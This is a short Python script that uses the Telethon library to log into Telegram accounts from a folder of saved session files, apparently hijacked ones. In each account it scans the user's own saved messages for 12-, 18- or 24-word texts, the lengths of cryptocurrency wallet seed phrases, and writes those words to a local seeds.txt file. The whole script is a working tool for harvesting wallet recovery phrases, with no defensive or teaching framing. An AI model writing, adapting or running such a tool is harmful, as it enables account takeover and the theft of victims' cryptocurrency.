import asyncio
import glob
import re

from telethon import TelegramClient

api_id =
api_hash =


async def main():
    try:
        me = await client.get_me()
        user = me.id
        chat = client.iter_messages(user)
        async for messages in chat:
            if messages:
                r = re.compile("[a-zA-Z]+")
                words = messages.text.split(" ")
                if len(words) == 12 or len(words) == 18 or len(words) == 24:
                    seed = [w for w in filter(r.match, words)]
                    for i in seed:
                        with open("seeds.txt", "a+") as f:
                            f.write(f"\n{i}")
                    with open("seeds.txt", "a+") as f:
                        f.write("\n")


    except Exception as e:
        print(e)


files_list = glob.glob(r"sessions\*.session")
for file in files_list:
    client = TelegramClient(file, api_id, api_hash)
    client.start()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
